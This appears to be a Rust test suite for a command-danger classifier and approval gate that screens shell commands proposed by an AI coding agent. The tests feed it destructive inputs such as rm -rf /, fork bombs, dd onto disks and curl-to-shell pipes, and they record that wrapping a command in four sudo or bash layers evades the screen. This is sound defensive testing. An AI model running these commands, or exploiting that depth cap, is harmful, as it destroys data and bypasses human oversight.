            &serde_json::json!({ "command": "curl example.com", "networkApprovalContext": {} }),
        )
        .unwrap();
        assert!(matches!(
            kind,
            ApprovalKind::CommandExecution {
                wants_network: true,
                ..
            }
        ));
    }

    // ── is_dangerous ──

    #[test]
    fn dangerous_rm_rf_root() {
        assert!(is_dangerous(&svec(&["rm", "-rf", "/"])));
        assert!(is_dangerous(&svec(&["rm", "-fr", "/"])));
    }

    #[test]
    fn dangerous_fork_bomb() {
        assert!(is_dangerous(&svec(&[":(){", ":|:&", "};:"])));
    }

    #[test]
    fn dangerous_mkfs_and_dd_and_curl_pipe_sh() {
        assert!(is_dangerous(&svec(&["mkfs.ext4", "/dev/sda1"])));
        assert!(is_dangerous(&svec(&["dd", "if=/dev/zero", "of=/dev/sda"])));
        assert!(is_dangerous(&svec(&["curl", "evil.sh", "|", "sh"])));
    }

    #[test]
    fn safe_commands_not_dangerous() {
        assert!(!is_dangerous(&svec(&["git", "status"])));
        assert!(!is_dangerous(&svec(&["rm", "-rf", "build/"])));
        assert!(!is_dangerous(&svec(&["ls", "-la"])));
    }

    /// Quoting must not let a destructive command slip past the fail-closed
    /// screen. Without quote normalization, the target token is `"/"`/`'/'` (so
    /// the token-equality check misses) and the joined form keeps the quotes
    /// (so the `rm -rf /` substring check misses). Both branches must still fire.
    #[test]
    fn dangerous_quoted_rm_rf_root() {
        // Double-quoted target as a single token (e.g. argv from a shell parse).
        assert!(is_dangerous(&svec(&["rm", "-rf", "\"/\""])));
        // Single-quoted target.
        assert!(is_dangerous(&svec(&["rm", "-rf", "'/'"])));
        // Quoted flag + quoted target combination.
        assert!(is_dangerous(&svec(&["rm", "\"-rf\"", "\"/\""])));
    }

    /// `dd of="/dev/sda"` must flag even when the device path is quoted.
    #[test]
    fn dangerous_quoted_dd_and_block_device() {
        assert!(is_dangerous(&svec(&[
            "dd",
            "if=/dev/zero",
            "of=\"/dev/sda\""
        ])));
        assert!(is_dangerous(&svec(&[
            "dd",
            "if=/dev/zero",
            "of='/dev/sda'"
        ])));
    }

    /// #6166 — a destructive command hidden inside a shell-interpreter wrapper
    /// (`bash -lc "…"`, `sh -c "…"`) must be unwrapped and screened. The wrapper
    /// program is `bash`/`sh`, so the `rm`/`dd` program-gated rules would
    /// otherwise be skipped entirely.
    #[test]
    fn dangerous_shell_wrapper_unwraps_inline_command() {
        // `bash -lc "rm -rf /"` — program is `bash`, payload is the rm.
        assert!(is_dangerous(&svec(&["bash", "-lc", "rm -rf /"])));
        // `sh -c "dd if=/dev/zero of=/dev/sda"` — payload is the dd.
        assert!(is_dangerous(&svec(&[
            "sh",
            "-c",
            "dd if=/dev/zero of=/dev/sda"
        ])));
        // Other interpreters + flag spellings.
        assert!(is_dangerous(&svec(&["zsh", "-c", "rm -rf /"])));
        assert!(is_dangerous(&svec(&["bash", "--command", "rm -rf /"])));
        // Split flags INSIDE the wrapper must also be caught (combines #6166+#6167).
        assert!(is_dangerous(&svec(&["bash", "-lc", "rm -r -f /"])));
        // Quoted target inside the wrapper.
        assert!(is_dangerous(&svec(&["sh", "-c", "rm -rf \"/\""])));
        // Nested wrapper within the depth cap.
        assert!(is_dangerous(&svec(&["bash", "-c", "sh -c \"rm -rf /\""])));
    }

    /// #7482 — exec wrappers must not hide the real program from the static
    /// dangerous-command backstop. These wrappers parse options before spawning
    /// a trailing command, so the screen must unwrap that payload first.
    #[test]
    fn dangerous_exec_wrapper_unwraps_payload_command() {
        let cases = vec![
            svec(&["env", "rm", "-rf", "/"]),
            svec(&["env", "-i", "PATH=/usr/bin", "rm", "-r", "-f", "/"]),
            svec(&["env", "-S", "rm -rf /"]),
            svec(&["sudo", "rm", "-rf", "/"]),
            svec(&["sudo", "-n", "-u", "root", "rm", "-rf", "/"]),
            svec(&["doas", "-u", "root", "rm", "-rf", "/"]),
            svec(&["nice", "-n", "5", "rm", "-rf", "/"]),
            svec(&["timeout", "5", "rm", "-rf", "/"]),
            svec(&["timeout", "-k", "1", "5", "rm", "-rf", "/"]),
            svec(&["nohup", "rm", "-rf", "/"]),
            svec(&["setsid", "-w", "rm", "-rf", "/"]),
            svec(&["stdbuf", "-oL", "rm", "-rf", "/"]),
            svec(&["xargs", "-I", "{}", "rm", "-rf", "/"]),
            svec(&["sudo", "bash", "-lc", "rm -rf /"]),
            svec(&["env", "FOO=bar", "sh", "-c", "dd if=/dev/zero of=/dev/sda"]),
        ];

        for argv in cases {
            assert!(is_dangerous(&argv), "expected dangerous: {argv:?}");
        }
    }

    /// #6166 — a benign wrapped command must NOT be flagged just because it is
    /// wrapped in a shell interpreter.
    #[test]
    fn safe_shell_wrapper_not_dangerous() {
        assert!(!is_dangerous(&svec(&["bash", "-lc", "ls -la"])));
        assert!(!is_dangerous(&svec(&["sh", "-c", "rm -rf ./build"])));
        assert!(!is_dangerous(&svec(&["bash", "-lc", "git status"])));
    }

    /// #7482 — benign commands remain allowed when wrapped; unwrapping must not
    /// turn every wrapper use into an automatic denial.
    #[test]
    fn safe_exec_wrapper_payload_not_dangerous() {
        let cases = vec![
            svec(&["env", "PATH=/usr/bin", "git", "status"]),
            svec(&["sudo", "-n", "git", "status"]),
            svec(&["nice", "-n", "5", "ls", "-la"]),
            svec(&["timeout", "5", "rm", "-rf", "./build"]),
            svec(&["nohup", "cargo", "test"]),
            svec(&["setsid", "-w", "git", "status"]),
            svec(&["stdbuf", "-oL", "cargo", "test"]),
            svec(&["xargs", "-I", "{}", "echo", "{}"]),
        ];

        for argv in cases {
            assert!(!is_dangerous(&argv), "expected safe: {argv:?}");
        }
    }

    /// #6167 — `rm` recursion + force flags split or reordered across multiple
    /// tokens must aggregate. A per-token predicate (one token holding both `r`
    /// and `f`) misses every split form, allowing `rm -r -f /` to bypass.
    #[test]
    fn dangerous_rm_split_and_reordered_flags() {
        assert!(is_dangerous(&svec(&["rm", "-r", "-f", "/"])));
        assert!(is_dangerous(&svec(&["rm", "-f", "-r", "/"])));
        assert!(is_dangerous(&svec(&["rm", "--recursive", "-f", "/"])));
        assert!(is_dangerous(&svec(&["rm", "-R", "-f", "/"])));
        assert!(is_dangerous(&svec(&["rm", "--recursive", "--force", "/"])));
        // Reordered relative to the target.
        assert!(is_dangerous(&svec(&["rm", "-f", "--recursive", "/"])));
    }

    /// #6167 — split flags that are NOT both recursive AND force, or that do not
    /// target root, must NOT be flagged by the aggregate path.
    #[test]
    fn safe_rm_split_flags_not_dangerous() {
        // Recursive without force on a non-root target.
        assert!(!is_dangerous(&svec(&["rm", "-r", "-f", "./build"])));
        // Recursive + force but NOT root.
        assert!(!is_dangerous(&svec(&["rm", "-r", "-f", "node_modules"])));
        // Recursive only (no force) on root → not auto-declined here.
        assert!(!is_dangerous(&svec(&["rm", "-r", "/"])));
        // Force only (no recursion) on root.
        assert!(!is_dangerous(&svec(&["rm", "-f", "/"])));
    }

    fn svec(parts: &[&str]) -> Vec<String> {
        parts.iter().map(|s| s.to_string()).collect()
    }

    // ── decide: fail-closed mutation guards ──

    #[tokio::test]
    async fn decide_unknown_method_declines() {
        let audit = Arc::new(RecordingAudit::default());
        let d = decider(
            PolicyVerdict::NoMatch,
            audit.clone(),
            Arc::new(DefaultDenyUiHook),
        );
        let decision = d.decide(1, "turn/completed", &serde_json::json!({})).await;
        assert_eq!(decision, ApprovalDecision::Decline);
        assert_eq!(audit.count(), 1, "even an unparseable request is audited");
    }

    #[tokio::test]
    async fn decide_dangerous_command_declines_even_with_auto_policy() {
        let audit = Arc::new(RecordingAudit::default());
        // Auto policy present, but the dangerous screen precedes policy lookup.
        let d = decider(
            PolicyVerdict::Auto {
                policy_id: "p1".to_string(),
                allow_network: true,
            },
            audit.clone(),
            Arc::new(DefaultDenyUiHook),
        );
        let decision = d
            .decide(
                1,
                "item/commandExecution/requestApproval",
                &cmd_params("rm -rf /"),
            )
            .await;
        assert_eq!(decision, ApprovalDecision::Decline);
        assert!(audit.last().1.contains("dangerous"));
    }

    #[tokio::test]
    async fn decide_no_match_escalates_to_ui_not_silent_accept() {
        let audit = Arc::new(RecordingAudit::default());
        let hook = Arc::new(RecordingUiHook {
            called: Mutex::new(false),
            answer: false,
        });
        let d = decider(PolicyVerdict::NoMatch, audit.clone(), hook.clone());
        let decision = d
            .decide(
                1,
                "item/commandExecution/requestApproval",
                &cmd_params("git status"),
            )
            .await;
        assert_eq!(decision, ApprovalDecision::Decline);
        assert!(*hook.called.lock().unwrap(), "no match must escalate to UI");
    }

    #[tokio::test]
    async fn decide_policy_error_declines() {
        let audit = Arc::new(RecordingAudit::default());
        let d = CodexApprovalDecider::new(
            Arc::new(FixedPolicy(Err("backend down".to_string()))),
            audit.clone(),
            Arc::new(DefaultDenyUiHook),
        );
        let decision = d
            .decide(
                1,
                "item/commandExecution/requestApproval",
                &cmd_params("git status"),
            )
            .await;
        assert_eq!(decision, ApprovalDecision::Decline);
        assert!(audit.last().1.contains("policy_error"));
    }

    #[tokio::test]
    async fn decide_block_declines() {
        let audit = Arc::new(RecordingAudit::default());
        let d = decider(
            PolicyVerdict::Block {
                policy_id: "p1".to_string(),
            },
            audit.clone(),
            Arc::new(DefaultDenyUiHook),
        );
        let decision = d
            .decide(
                1,
                "item/commandExecution/requestApproval",
                &cmd_params("git status"),
            )
            .await;
        assert_eq!(decision, ApprovalDecision::Decline);
    }

    #[tokio::test]
    async fn decide_ui_timeout_declines() {
        let audit = Arc::new(RecordingAudit::default());
        let d = decider(
            PolicyVerdict::Confirm {
                policy_id: "p1".to_string(),
            },
            audit.clone(),
            Arc::new(NeverResolvingHook),
        )
        .with_ui_timeout(Duration::from_millis(10));
        let decision = d
            .decide(
                1,
                "item/commandExecution/requestApproval",
                &cmd_params("git status"),
            )
            .await;
        assert_eq!(decision, ApprovalDecision::Decline);
        assert!(
            audit.last().0.contains("timeout"),
            "UI timeout is logged distinctly: {:?}",
            audit.last()
        );
    }

    #[tokio::test]
    async fn decide_ui_channel_drop_declines() {
        let audit = Arc::new(RecordingAudit::default());
        let d = decider(
            PolicyVerdict::Confirm {
                policy_id: "p1".to_string(),
            },
            audit.clone(),
            Arc::new(DropSenderHook),
        );
        let decision = d
            .decide(
                1,
                "item/commandExecution/requestApproval",
                &cmd_params("git status"),
            )
            .await;
        assert_eq!(decision, ApprovalDecision::Decline);
    }

    // ── decide: accept paths ──

    #[tokio::test]
    async fn decide_auto_policy_accepts() {
        let audit = Arc::new(RecordingAudit::default());
        let d = decider(
            PolicyVerdict::Auto {
                policy_id: "p1".to_string(),
                allow_network: false,
            },
            audit.clone(),
            Arc::new(DefaultDenyUiHook),
        );
        let decision = d
            .decide(
                1,
                "item/commandExecution/requestApproval",
                &cmd_params("git status"),
            )
            .await;
        assert_eq!(decision, ApprovalDecision::Accept);
        assert!(audit.last().0.contains("approved"));
    }

    #[tokio::test]
    async fn decide_confirm_with_ui_approve_accepts() {
        let audit = Arc::new(RecordingAudit::default());
        let hook = Arc::new(RecordingUiHook {
            called: Mutex::new(false),
            answer: true,
        });
        let d = decider(
            PolicyVerdict::Confirm {
                policy_id: "p1".to_string(),
            },
            audit.clone(),
            hook.clone(),
        );
        let decision = d
            .decide(
                1,
                "item/commandExecution/requestApproval",
                &cmd_params("git status"),
            )
            .await;
        assert_eq!(decision, ApprovalDecision::Accept);
        assert!(*hook.called.lock().unwrap());
    }

    // ── network default-deny ──

    #[tokio::test]
    async fn network_context_without_opt_in_declines_even_under_auto() {
        let audit = Arc::new(RecordingAudit::default());
        let d = decider(
            PolicyVerdict::Auto {
                policy_id: "p1".to_string(),
                allow_network: false,
            },
            audit.clone(),
            Arc::new(DefaultDenyUiHook),
        );
        let decision = d
            .decide(
                1,
                "item/commandExecution/requestApproval",
                &serde_json::json!({ "command": "curl example.com", "networkApprovalContext": {} }),
            )
            .await;
        assert_eq!(decision, ApprovalDecision::Decline);
        assert!(audit.last().1.contains("network_default_deny"));
    }

    #[tokio::test]
    async fn network_context_with_opt_in_and_auto_accepts() {
        let audit = Arc::new(RecordingAudit::default());
        let d = decider(
            PolicyVerdict::Auto {
                policy_id: "p1".to_string(),
                allow_network: true,
            },
            audit.clone(),
            Arc::new(DefaultDenyUiHook),
        );
        let decision = d
            .decide(
                1,
                "item/commandExecution/requestApproval",
                &serde_json::json!({ "command": "curl example.com", "networkApprovalContext": {} }),
            )
            .await;
        assert_eq!(decision, ApprovalDecision::Accept);
    }

    // ── UI render detail threading (E21 #5044) ──

    #[tokio::test]
    async fn command_escalation_threads_process_name_and_args_to_ui() {
        // A Confirm verdict escalates with the program name + argv tail so the
        // FU-A modal can render the command — proving the render fields are not
        // dropped on the way to the UI hook.
        let audit = Arc::new(RecordingAudit::default());
        let hook = Arc::new(CapturingUiHook {
            captured: Mutex::new(None),
            answer: false,
        });
        let d = decider(
            PolicyVerdict::Confirm {
                policy_id: "p1".to_string(),
            },
            audit,
            hook.clone(),
        );
        let _ = d
            .decide(
                7,
                "item/commandExecution/requestApproval",
                &cmd_params("git commit -m wip"),
            )
            .await;
        let ctx = hook.captured.lock().unwrap().clone().expect("ctx captured");
        assert_eq!(ctx.request_id, 7);
        assert_eq!(ctx.kind, "command");
        assert_eq!(ctx.process_name.as_deref(), Some("git"));
        assert_eq!(ctx.args, vec!["commit", "-m", "wip"]);
        assert!(ctx.diff_line_count.is_none());
        // Network is default-deny before escalation: never granted via UI.
        assert!(ctx.network_host.is_none());
        // Render-safe + serializable for the Tauri event (camelCase).
        let json = serde_json::to_value(&ctx).unwrap();
        assert_eq!(json["processName"], "git");
        assert_eq!(json["requestId"], 7);
    }

    #[tokio::test]
    async fn file_change_escalation_threads_diff_line_count_to_ui() {
        let audit = Arc::new(RecordingAudit::default());
        let hook = Arc::new(CapturingUiHook {
            captured: Mutex::new(None),
            answer: false,
        });
        let d = CodexApprovalDecider::new(
            Arc::new(FixedPolicy(Ok(PolicyVerdict::NoMatch))),
            audit,
            hook.clone(),
        );
        let _ = d
            .decide(
                8,
                "item/fileChange/requestApproval",
                &serde_json::json!({ "diff": "--- a\n+++ b\n+added\n" }),
            )
            .await;
        let ctx = hook.captured.lock().unwrap().clone().expect("ctx captured");
        assert_eq!(ctx.kind, "file_change");
        assert_eq!(ctx.diff_line_count, Some(3));
        assert!(ctx.process_name.is_none());
        assert!(ctx.args.is_empty());
        let json = serde_json::to_value(&ctx).unwrap();
        assert_eq!(json["diffLineCount"], 3);
    }

    // ── audit completeness ──

    #[tokio::test]
    async fn every_decision_is_audited() {
        let audit = Arc::new(RecordingAudit::default());
        let d = decider(
            PolicyVerdict::Auto {
                policy_id: "p1".to_string(),
                allow_network: false,
            },
            audit.clone(),
            Arc::new(DefaultDenyUiHook),
        );
        d.decide(
            1,
            "item/commandExecution/requestApproval",
            &cmd_params("git status"),
        )
        .await;
        assert_eq!(audit.count(), 1);
        let (action, details) = audit.last();
        assert!(action.contains("approved"));
        assert!(details.contains("process_name=git"));
    }
}

/// #10131: mutation guards for the command-danger classifier.
///
/// `cargo-mutants` found 49 surviving mutants in this file — operators and
/// boundaries that could be flipped with the whole suite still green. This is
/// the gate that decides whether a proposed command is destructive, so a
/// surviving `||` → `&&` in the dangerous-command chains makes the check
/// strictly narrower, i.e. **fails open**.
///
/// Each test below pins one specific arm, boundary, or negation as
/// independently load-bearing. Inputs are chosen so that exactly one condition
/// carries the result — a case that several conditions would satisfy proves
/// nothing about any of them.
#[cfg(test)]
mod mutation_guard_tests {
    use super::*;

    fn argv(parts: &[&str]) -> Vec<String> {
        parts.iter().map(|s| (*s).to_string()).collect()
    }

    fn dangerous(parts: &[&str]) -> bool {
        is_dangerous(&argv(parts))
    }

    // ---- is_file_change_approval: both halves required -------------------

    #[test]
    fn file_change_approval_needs_both_the_subject_and_an_approval_verb() {
        assert!(is_file_change_approval("codex/fileChange/requestApproval"));
        // Subject without an approval verb.
        assert!(!is_file_change_approval("codex/fileChange/notify"));
        // Approval verb without the file-change subject.
        assert!(!is_file_change_approval("codex/exec/requestApproval"));
    }

    // ---- strip_surrounding_quotes: the trailing quote is dropped ----------

    #[test]
    fn strip_surrounding_quotes_drops_both_delimiters() {
        assert_eq!(strip_surrounding_quotes("\"abc\""), "abc");
        assert_eq!(strip_surrounding_quotes("'abc'"), "abc");
        // Mismatched or absent pairs are left intact.
        assert_eq!(strip_surrounding_quotes("\"abc'"), "\"abc'");
        assert_eq!(strip_surrounding_quotes("abc"), "abc");
    }

    // ---- env_assignment: non-empty name AND an all-valid charset ---------

    #[test]
    fn env_assignment_requires_a_non_empty_name() {
        assert!(env_assignment("FOO=1"));
        // Empty name: the charset check vacuously passes on an empty string, so
        // the emptiness guard is the only thing rejecting this.
        assert!(!env_assignment("=1"));
    }

    #[test]
    fn env_assignment_accepts_underscore_in_the_name() {
        // Underscore is accepted only by the explicit `c == '_'` arm — it is not
        // ascii-alphanumeric.
        assert!(env_assignment("FOO_BAR=1"));
        assert!(!env_assignment("FOO-BAR=1"));
    }

    // ---- option_takes_value: each rejection arm is load-bearing ----------

    #[test]
    fn option_takes_value_matches_a_short_flag_with_an_attached_value() {
        // Length > 2 must NOT disqualify a short flag carrying its value inline.
        assert!(option_takes_value("-uFOO", &['u'], &[]));
        assert!(option_takes_value("-u", &['u'], &[]));
    }

    #[test]
    fn option_takes_value_rejects_a_token_without_a_leading_dash() {
        // `ab` starts with a listed short letter but has no dash. The
        // leading-dash rejection is the only thing keeping this false.
        assert!(!option_takes_value("ab", &['a', 'b'], &[]));
    }

    #[test]
    fn option_takes_value_rejects_a_bare_dash_and_short_tokens() {
        assert!(!option_takes_value("-", &['u'], &[]));
        assert!(!option_takes_value("", &['u'], &[]));
    }

    // ---- payload_from: the index bound is exclusive ----------------------

    #[test]
    fn payload_from_past_the_end_is_none_not_an_empty_payload() {
        let norm = argv(&["a", "b"]);
        assert_eq!(payload_from(&norm, 1), Some(argv(&["b"])));
        // idx == len must be None. An empty Some(vec![]) would read downstream
        // as "there is a payload, and it is empty".
        assert_eq!(payload_from(&norm, 2), None);
    }

    // ---- skip_wrapper_options / exec_wrapper_payload ---------------------

    #[test]
    fn exec_wrapper_double_dash_starts_the_payload_after_the_separator() {
        // `idx + 1` must land past `--`; off-by-one either way re-includes the
        // separator or the wrapper program itself.
        assert_eq!(
            exec_wrapper_payload(&argv(&["sudo", "--", "rm", "-rf", "/"])),
            Some(argv(&["rm", "-rf", "/"]))
        );
    }

    #[test]
    fn exec_wrapper_accepts_a_two_token_command() {
        // len == 2 is the smallest viable wrapper+payload. A `<=` bound here
        // would reject every `sudo <cmd>` with no arguments.
        assert_eq!(
            exec_wrapper_payload(&argv(&["sudo", "rm"])),
            Some(argv(&["rm"]))
        );
        assert_eq!(exec_wrapper_payload(&argv(&["sudo"])), None);
    }

    #[test]
    fn exec_wrapper_option_with_separate_value_skips_both_tokens() {
        assert_eq!(
            exec_wrapper_payload(&argv(&["sudo", "-u", "root", "rm", "-rf", "/"])),
            Some(argv(&["rm", "-rf", "/"]))
        );
    }

    #[test]
    fn exec_wrapper_trailing_value_option_does_not_run_past_the_end() {
        // `sudo -u` consumes the flag and then finds no value. Walking past the
        // end here would index out of bounds.
        assert_eq!(exec_wrapper_payload(&argv(&["sudo", "-u"])), None);
    }

    // ---- env_wrapper_payload --------------------------------------------

    #[test]
    fn env_double_dash_starts_the_payload_after_the_separator() {
        assert_eq!(
            env_wrapper_payload(&argv(&["env", "--", "rm", "-rf", "/"])),
            Some(argv(&["rm", "-rf", "/"]))
        );
    }

    #[test]
    fn env_split_string_without_a_script_is_none() {
        // `idx + 1 >= len` is the guard; off-by-one turns this into
        // `Some(vec![])`, which downstream reads as an empty command rather
        // than "no payload".
        assert_eq!(env_wrapper_payload(&argv(&["env", "-S"])), None);
    }

    #[test]
    fn env_split_string_re_splits_the_inline_script() {
        assert_eq!(
            env_wrapper_payload(&argv(&["env", "-S", "rm -rf /"])),
            Some(argv(&["rm", "-rf", "/"]))
        );
        assert_eq!(
            env_wrapper_payload(&argv(&["env", "--split-string=rm -rf /"])),
            Some(argv(&["rm", "-rf", "/"]))
        );
    }

    #[test]
    fn env_assignments_are_skipped_before_the_payload() {
        assert_eq!(
            env_wrapper_payload(&argv(&["env", "FOO=1", "BAR=2", "rm", "-rf", "/"])),
            Some(argv(&["rm", "-rf", "/"]))
        );
        // Only assignments and no payload: walking past the end must stop.
        assert_eq!(env_wrapper_payload(&argv(&["env", "FOO=1"])), None);
    }

    #[test]
    fn env_value_taking_option_consumes_its_value_token() {
        // `-u` takes a separate value, so BOTH `-u` and `NAME` are skipped.
        // Every conjunct in `takes_separate_value` participates: it must be a
        // listed option, must not carry an inline `=`, and must be either a
        // 2-char short flag or a long `--` option.
        assert_eq!(
            env_wrapper_payload(&argv(&["env", "-u", "NAME", "rm", "-rf", "/"])),
            Some(argv(&["rm", "-rf", "/"]))
        );
        assert_eq!(
            env_wrapper_payload(&argv(&["env", "--unset", "NAME", "rm", "-rf", "/"])),
            Some(argv(&["rm", "-rf", "/"]))
        );
    }

    #[test]
    fn env_valueless_option_does_not_consume_the_program() {
        // `-i` is NOT a value-taking option, so the next token is the payload.
        // A mutant that treats every flag as value-taking eats `rm`.
        assert_eq!(
            env_wrapper_payload(&argv(&["env", "-i", "rm", "-rf", "/"])),
            Some(argv(&["rm", "-rf", "/"]))
        );
    }

    #[test]
    fn env_inline_value_option_does_not_consume_the_next_token() {
        // `--unset=NAME` already carries its value, so `rm` is the payload.
        // This is the arm the `!arg.contains('=')` conjunct guards.
        assert_eq!(
            env_wrapper_payload(&argv(&["env", "--unset=NAME", "rm", "-rf", "/"])),
            Some(argv(&["rm", "-rf", "/"]))
        );
    }

    #[test]
    fn env_trailing_value_option_yields_no_payload() {
        // `-u` with a value but nothing after it: the payload is genuinely
        // absent, not `Some(["NAME"])`.
        assert_eq!(env_wrapper_payload(&argv(&["env", "-u", "NAME"])), None);
    }

    // ---- is_command_flag: every conjunct is load-bearing -----------------

    #[test]
    fn command_flag_accepts_long_form_and_short_bundles_containing_c() {
        assert!(is_command_flag("--command"));
        assert!(is_command_flag("-c"));
        assert!(is_command_flag("-lc"));
        assert!(is_command_flag("-ec"));
    }

    #[test]
    fn command_flag_rejects_each_way_a_token_can_fail() {
        // Long option other than `--command`: passes the length test, fails the
        // "not a `--` option" test.
        assert!(!is_command_flag("--force"));
        // No leading dash at all, though the letters would qualify.
        assert!(!is_command_flag("abc"));
        // Leading `--` with a `c` after it.
        assert!(!is_command_flag("--c"));
        // Non-alphabetic character in the bundle.
        assert!(!is_command_flag("-x9c"));
        // Short bundle without a `c`.
        assert!(!is_command_flag("-lf"));
        // Too short / bare dash.
        assert!(!is_command_flag("-"));
    }

    // ---- is_dangerous: rm root-target arms are independently sufficient --

    #[test]
    fn rm_each_root_target_form_is_independently_dangerous() {
        // Split `-r -f` deliberately so the contiguous `rm -rf /` substring
        // fallback does NOT fire — otherwise it would mask the token-equality
        // arms and these mutants would survive.
        assert!(dangerous(&["rm", "-r", "-f", "/"]));
        assert!(dangerous(&["rm", "-r", "-f", "/*"]));
        assert!(dangerous(&["rm", "-r", "-f", "~"]));
        assert!(dangerous(&["rm", "-r", "-f", "~/"]));
        assert!(dangerous(&["rm", "-r", "-f", "/.ssh"]));
    }

    #[test]
    fn rm_contiguous_bundle_fallback_matches_either_letter_order() {
        // Targets a non-root path so the token-equality rule above cannot fire;
        // only the literal substring fallback can flag these.
        assert!(dangerous(&["rm", "-rf", "/home/user"]));
        assert!(dangerous(&["rm", "-fr", "/home/user"]));
    }

    // ---- fork bomb: both recognition forms are independently sufficient --

    #[test]
    fn fork_bomb_raw_and_despaced_forms_are_each_sufficient() {
        // Raw `:(){` present, but the fully despaced signature is not.
        assert!(dangerous(&[":(){", "echo", "hi;", "}"]));
        // Despaced signature present, but the raw `:(){` substring is not.
        assert!(dangerous(&[
            ":", "(", ")", "{", ":", "|", ":", "&", "}", ";", ":"
        ]));
    }

    // ---- dd: program AND target are both required ------------------------

    #[test]
    fn dd_requires_both_the_program_and_a_device_target() {
        assert!(dangerous(&["dd", "if=/dev/zero", "of=/dev/sda"]));
        // Right program, harmless target.
        assert!(!dangerous(&["dd", "if=/dev/zero", "of=disk.img"]));
        // Device target, but not `dd`.
        assert!(!dangerous(&["cp", "of=/dev/sda", "x"]));
    }

    // ---- pipe-to-shell: each shell spelling is independently sufficient --

    #[test]
    fn pipe_to_shell_each_spelling_is_independently_dangerous() {
        assert!(dangerous(&["curl", "http://x", "|", "sh"]));
        assert!(dangerous(&["curl", "http://x", "|sh"]));
        assert!(dangerous(&["curl", "http://x", "|", "bash"]));
        assert!(dangerous(&["curl", "http://x", "|bash"]));
        // The fetcher half: wget alone also qualifies.
        assert!(dangerous(&["wget", "http://x", "|", "sh"]));
        // Neither half alone is enough.
        assert!(!dangerous(&["curl", "http://x", "-o", "out"]));
        assert!(!dangerous(&["cat", "x", "|", "sh"]));
    }

    // ---- block-device overwrite: spaced and unspaced both count ----------

    #[test]
    fn block_device_redirect_matches_with_and_without_a_space() {
        assert!(dangerous(&["cat", "x", ">", "/dev/sda"]));
        assert!(dangerous(&["cat", "x", ">/dev/sda"]));
    }

    // ---- wrapper unwrapping: depth bound and increment --------------------

    #[test]
    fn exec_wrapper_unwrapping_stops_at_the_documented_depth_cap() {
        // Three wrapper layers still unwrap to the dangerous payload.
        assert!(dangerous(&["sudo", "sudo", "sudo", "rm", "-rf", "/"]));
        // A fourth layer exceeds MAX_WRAPPER_DEPTH and is NOT screened. This
        // pins the documented cap (a deliberate bound against unbounded
        // recursion on crafted input), not an aspiration — see the PR note.
        assert!(!dangerous(&[
            "sudo", "sudo", "sudo", "sudo", "rm", "-rf", "/"
        ]));
    }

    #[test]
    fn shell_wrapper_unwrapping_stops_at_the_documented_depth_cap() {
        assert!(dangerous(&["bash", "-lc", "\"rm", "-rf", "/\""]));
        // Reached at depth 3 via exec wrappers, the shell unwrap no longer runs.
        assert!(!dangerous(&[
            "sudo", "sudo", "sudo", "bash", "-lc", "\"rm", "-rf", "/\""
        ]));
    }

    #[test]
    fn nested_shell_wrappers_increment_the_depth_counter() {
        // Three nested SHELL layers still unwrap to the dangerous payload.
        assert!(dangerous(&[
            "bash", "-c", "bash", "-c", "bash", "-c", "rm", "-rf", "/"
        ]));
        // A fourth exceeds the cap. This is the only shape that exercises the
        // depth increment on the SHELL branch: the exec-wrapper test above
        // reaches depth 3 through `sudo` layers, so the shell branch's own
        // `depth + 1` never runs there and a mutant on it survived.
        assert!(!dangerous(&[
            "bash", "-c", "bash", "-c", "bash", "-c", "bash", "-c", "rm", "-rf", "/"
        ]));
    }

    #[test]
    fn shell_unwrapping_applies_only_to_known_interpreters() {
        // `foo -c "..."` must NOT be re-screened: the unwrap is gated on the
        // program being a known shell, so both halves of that guard matter.
        assert!(!dangerous(&["foo", "-c", "\"rm", "-rf", "/\""]));
        assert!(dangerous(&["sh", "-c", "\"rm", "-rf", "/\""]));
    }
}
